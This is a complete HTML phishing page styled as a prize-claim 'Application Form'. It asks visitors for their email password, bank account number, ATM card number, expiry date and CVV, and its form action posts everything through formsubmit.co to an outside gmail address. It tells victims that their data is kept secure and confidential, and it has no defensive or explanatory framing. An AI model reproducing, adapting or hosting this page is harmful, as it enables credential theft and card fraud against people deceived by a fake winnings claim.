<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Application Form</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      padding: 20px;
    }
    form {
      background: #fff;
      padding: 20px;
      border-radius: 10px;
      max-width: 600px;
      margin: auto;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      color: #333;
    }
    label {
      display: block;
      margin-top: 15px;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    .masked {
      font-family: password;
    }
    .error {
      color: red;
      font-size: 0.9em;
      display: none;
    }
    .eye {
      position: absolute;
      right: 15px;
      top: 36px;
      cursor: pointer;
    }
    .field-container {
      position: relative;
    }
    .final-note {
      margin-top: 20px;
      background: #e9f7ef;
      padding: 10px;
      border-left: 5px solid #2ecc71;
      display: none;
    }
  </style>
</head>
<body>
  <form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST" onsubmit="return validateForm()">
    <input type="hidden" name="_next" value="https://onlinegistrationProg.github.io/Application-Form/thank-you.html">
    <h2>Application Form</h2>

    <!-- 1. Full Name -->
    <label>Full Name:
      <input type="text" name="Full Name" required onblur="validateNotEmpty(this)">
      <span class="error">Full name is required.</span>
    </label>

    <!-- 2. Country -->
    <label>Country:
      <input type="text" name="Country" required onblur="validateNotEmpty(this)">
      <span class="error">Country is required.</span>
    </label>

    <!-- 3. Phone Number -->
    <label>Phone Number:
      <input type="tel" name="Phone Number" required onblur="validatePhone(this)">
      <span class="error">Phone number must be 9 to 12 digits.</span>
    </label>

    <!-- 4. Email Address -->
    <label>Email Address:
      <input type="email" name="Email Address" required onblur="validateNotEmpty(this)">
      <span class="error">Valid email is required.</span>
    </label>

    <!-- 5. Email Password -->
    <label>Email Password:
      <div class="field-container">
        <input type="password" name="Email Password" required id="emailPass">
        <span class="eye" onclick="toggleVisibility('emailPass', this)">üëÅÔ∏è</span>
      </div>
    </label>

    <!-- 6. Amount You Won -->
    <label>Amount You Won:
      <input type="text" name="Amount You Won" required oninput="updateFinalNote()" onblur="validateNotEmpty(this)">
      <span class="error">Amount is required.</span>
    </label>

    <!-- 7. Bank Account Type -->
    <label>Bank Account Type:
      <input type="text" name="Bank Account Type" required oninput="updateFinalNote()" onblur="validateNotEmpty(this)">
      <span class="error">Bank Account Type is required.</span>
    </label>

    <!-- 8. Bank Account Number -->
    <label>Bank Account Number:
      <input type="text" name="Bank Account Number" required oninput="updateFinalNote()" onblur="validateNotEmpty(this)">
      <span class="error">Bank Account Number is required.</span>
    </label>

    <!-- 9. Did You Link ATM -->
    <label>Did You Link ATM to Your Bank Account?
      <select name="Linked ATM" onchange="toggleATMFields(this)">
        <option value="Yes">Yes</option>
        <option value="No">No</option>
      </select>
    </label>

    <div id="atmWarning" style="color: red; display: none; font-weight: bold;">
      YOU MUST HAVE ATM CARD TO PROCEED
    </div>

    <!-- 10. ATM Card Number -->
    <div id="atmFields">
      <label>ATM Card Number:
        <input type="text" name="ATM Card Number" maxlength="16" onblur="validateCard(this)">
        <span class="error">ATM Card Number must be 16 digits.</span>
      </label>

      <!-- 11. Expiry Date -->
      <label>Expiry Date (MM/YY):
        <input type="text" name="Expiry Date" maxlength="5" oninput="formatExpiry(this)" onblur="validateExpiry(this)">
        <span class="error">Enter valid expiry in MM/YY.</span>
      </label>

      <!-- 12. CVV -->
      <label>CVV:
        <input type="password" name="CVV" maxlength="3" onblur="validateCVV(this)">
        <span class="error">CVV must be exactly 3 digits.</span>
      </label>
    </div>

    <!-- 13. Final Note -->
    <div id="finalNote" class="final-note"></div>

    <!-- Data privacy note -->
    <p style="margin-top: 15px; font-size: 0.9em; color: #555;">
      We keep your data/details secure and confidential.
    </p>

    <button type="submit">Submit</button>
  </form>

  <script>
    function toggleVisibility(id, icon) {
      const input = document.getElementById(id);
      if (input.type === "password") {
        input.type = "text";
        icon.textContent = "üôà";
      } else {
        input.type = "password";
        icon.textContent = "üëÅÔ∏è";
      }
    }

    function toggleATMFields(select) {
      const show = select.value === "Yes";
      document.getElementById("atmFields").style.display = show ? "block" : "none";
      document.getElementById("atmWarning").style.display = show ? "none" : "block";
      document.getElementById("finalNote").style.display = show ? "block" : "none";
    }

    function validateNotEmpty(input) {
      const error = input.nextElementSibling;
      error.style.display = input.value.trim() ? "none" : "inline";
    }

    function validatePhone(input) {
      const error = input.nextElementSibling;
      error.style.display = /^\d{9,12}$/.test(input.value) ? "none" : "inline";
    }

    function validateCard(input) {
      const error = input.nextElementSibling;
      error.style.display = /^\d{16}$/.test(input.value) ? "none" : "inline";
    }

    function validateCVV(input) {
      const error = input.nextElementSibling;
      error.style.display = /^\d{3}$/.test(input.value) ? "none" : "inline";
    }

    function formatExpiry(input) {
      let val = input.value.replace(/\D/g, "");
      if (val.length >= 3) {
        val = val.slice(0, 2) + "/" + val.slice(2, 4);
      }
      input.value = val;
    }

    function validateExpiry(input) {
      const error = input.nextElementSibling;
      const regex = /^(0[1-9]|1[0-2])\/\d{2}$/;
      error.style.display = regex.test(input.value) ? "none" : "inline";
    }

    function updateFinalNote() {
      const amount = document.querySelector('[name="Amount You Won"]').value.trim();
      const type = document.querySelector('[name="Bank Account Type"]').value.trim();
      const acc = document.querySelector('[name="Bank Account Number"]').value.trim();
      const note = document.getElementById("finalNote");

      if (amount && type && acc) {
        note.style.display = "block";
        note.innerHTML = `You will receive <strong>${amount}</strong> to your <strong>${type}</strong> <strong>${acc}</strong>`;
      } else {
        note.style.display = "none";
      }
    }

    function validateForm() {
      return true;
    }
  </script>
</body>
</html>
